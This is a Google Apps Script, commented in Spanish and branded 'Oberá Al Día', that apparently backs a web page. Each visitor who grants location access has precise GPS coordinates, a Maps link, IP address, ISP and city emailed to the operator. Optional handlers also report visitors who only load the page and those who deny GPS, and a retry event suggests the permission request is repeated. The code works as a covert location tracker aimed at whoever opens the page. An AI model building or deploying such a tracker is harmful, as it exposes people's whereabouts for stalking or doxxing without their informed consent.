// ============================================
// SCRIPT PARA GOOGLE APPS SCRIPT
// Envía email cada vez que alguien acepta GPS
// ============================================

/**
 * Configuración - EDITA TU EMAIL AQUÍ
 */
const CONFIG = {
  emailDestino: 'TU_EMAIL@gmail.com', // 👈 REEMPLAZAR con tu email
  asuntoEmail: '📍 Nueva ubicación GPS - Oberá Al Día',
  
  // Opcional: enviar también para eventos sin GPS
  notificarSinGPS: false // true = notifica incluso si rechazan GPS
};

/**
 * Función que recibe los datos vía POST
 */
function doPost(e) {
  try {
    // Parsear datos recibidos
    var data = JSON.parse(e.postData.contents);
    
    // Solo procesar ciertos eventos
    if (data.event === 'gps_granted' || data.event === 'gps_granted_retry') {
      // GPS ACEPTADO - Enviar email
      enviarEmailConGPS(data);
      
    } else if (data.event === 'page_load' && CONFIG.notificarSinGPS) {
      // Solo IP/ISP (opcional)
      enviarEmailSinGPS(data);
      
    } else if (data.event === 'gps_denied' && CONFIG.notificarSinGPS) {
      // GPS rechazado (opcional)
      enviarEmailRechazo(data);
    }
    
    return ContentService.createTextOutput('OK');
    
  } catch (error) {
    Logger.log('Error: ' + error.toString());
    return ContentService.createTextOutput('ERROR: ' + error.toString());
  }
}

/**
 * Enviar email cuando se acepta GPS
 */
function enviarEmailConGPS(data) {
  var lat = data.gpsData?.latitude || 0;
  var lng = data.gpsData?.longitude || 0;
  var accuracy = data.gpsData?.accuracy || 'N/A';
  
  // Link a Google Maps
  var mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
  
  // IP e ISP
  var ip = data.networkInfo?.ip || 'N/A';
  var isp = data.networkInfo?.isp || 'N/A';
  var city = data.networkInfo?.city || 'N/A';
  var region = data.networkInfo?.region || 'N/A';
  
  // Fecha y hora
  var fecha = new Date();
  var fechaFormateada = fecha.toLocaleDateString('es-AR') + ' ' + fecha.toLocaleTimeString('es-AR');
  
  // Construir mensaje HTML
  var mensajeHTML = 
    '<div style="font-family: Arial, sans-serif; max-width: 600px;">' +
    '<div style="background: linear-gradient(to right, #DC2626, #991B1B); color: white; padding: 20px; border-radius: 8px 8px 0 0;">' +
    '<h1 style="margin: 0;">📍 Nueva Ubicación GPS</h1>' +
    '<p style="margin: 5px 0 0 0; opacity: 0.9;">Oberá Al Día</p>' +
    '</div>' +
    
    '<div style="background: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-top: none; border-radius: 0 0 8px 8px;">' +
    
    '<p style="color: #666; margin: 0 0 20px 0;"><strong>Fecha:</strong> ' + fechaFormateada + '</p>' +
    
    '<div style="background: white; padding: 15px; border-radius: 6px; margin-bottom: 15px;">' +
    '<h3 style="margin-top: 0; color: #DC2626;">🌐 Información de Red</h3>' +
    '<p style="margin: 5px 0;"><strong>IP:</strong> ' + ip + '</p>' +
    '<p style="margin: 5px 0;"><strong>ISP:</strong> ' + isp + '</p>' +
    '<p style="margin: 5px 0;"><strong>Ciudad:</strong> ' + city + '</p>' +
    '<p style="margin: 5px 0;"><strong>Región:</strong> ' + region + '</p>' +
    '</div>' +
    
    '<div style="background: #D1FAE5; padding: 15px; border-radius: 6px; border-left: 4px solid #10B981;">' +
    '<h3 style="margin-top: 0; color: #047857;">✅ GPS Aceptado</h3>' +
    '<p style="margin: 5px 0;"><strong>Latitud:</strong> ' + lat + '</p>' +
    '<p style="margin: 5px 0;"><strong>Longitud:</strong> ' + lng + '</p>' +
    '<p style="margin: 5px 0;"><strong>Precisión:</strong> ' + accuracy + ' metros</p>' +
    '<p style="margin: 15px 0 5px 0;"><a href="' + mapUrl + '" style="background: #DC2626; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; display: inline-block;">🗺️ Ver en Google Maps</a></p>' +
    '</div>' +
    
    '<p style="color: #999; font-size: 12px; margin-top: 20px;">Session ID: ' + data.sessionId + '</p>' +
    
    '</div>' +
    '</div>';
  
  // Mensaje de texto plano (fallback)
  var mensajeTexto = 
    '📍 NUEVA UBICACIÓN GPS - Oberá Al Día\n\n' +
    'Fecha: ' + fechaFormateada + '\n' +
    'Session ID: ' + data.sessionId + '\n\n' +
    '🌐 INFORMACIÓN DE RED:\n' +
    'IP: ' + ip + '\n' +
    'ISP: ' + isp + '\n' +
    'Ciudad: ' + city + '\n' +
    'Región: ' + region + '\n\n' +
    '✅ GPS ACEPTADO:\n' +
    'Latitud: ' + lat + '\n' +
    'Longitud: ' + lng + '\n' +
    'Precisión: ' + accuracy + ' metros\n\n' +
    '🗺️ Ver en Google Maps:\n' +
    mapUrl;
  
  // Enviar email
  MailApp.sendEmail({
    to: CONFIG.emailDestino,
    subject: CONFIG.asuntoEmail,
    body: mensajeTexto,
    htmlBody: mensajeHTML
  });
  
  Logger.log('Email enviado a: ' + CONFIG.emailDestino);
}

/**
 * Enviar email cuando carga página (solo IP/ISP, sin GPS)
 */
function enviarEmailSinGPS(data) {
  var fecha = new Date().toLocaleString('es-AR');
  
  var mensaje = 
    '🌐 NUEVA VISITA (Sin GPS) - Oberá Al Día\n\n' +
    'Fecha: ' + fecha + '\n' +
    'IP: ' + (data.networkInfo?.ip || 'N/A') + '\n' +
    'ISP: ' + (data.networkInfo?.isp || 'N/A') + '\n' +
    'Ciudad: ' + (data.networkInfo?.city || 'N/A') + '\n' +
    'Dispositivo: ' + (data.deviceType || 'N/A');
  
  MailApp.sendEmail(CONFIG.emailDestino, '🌐 Nueva visita - Oberá Al Día', mensaje);
}

/**
 * Enviar email cuando rechazan GPS
 */
function enviarEmailRechazo(data) {
  var fecha = new Date().toLocaleString('es-AR');
  
  var mensaje = 
    '❌ GPS RECHAZADO - Oberá Al Día\n\n' +
    'Fecha: ' + fecha + '\n' +
    'IP: ' + (data.networkInfo?.ip || 'N/A') + '\n' +
    'Ciudad: ' + (data.networkInfo?.city || 'N/A') + '\n' +
    'Motivo: Usuario denegó el permiso';
  
  MailApp.sendEmail(CONFIG.emailDestino, '❌ GPS Rechazado - Oberá Al Día', mensaje);
}

/**
 * Función de prueba - Ejecuta esto para verificar que funciona
 */
function testEmail() {
  MailApp.sendEmail(
    CONFIG.emailDestino,
    '✅ Test - Oberá Al Día',
    'Si recibes este email, el sistema está configurado correctamente.'
  );
  
  Logger.log('Email de prueba enviado');
}
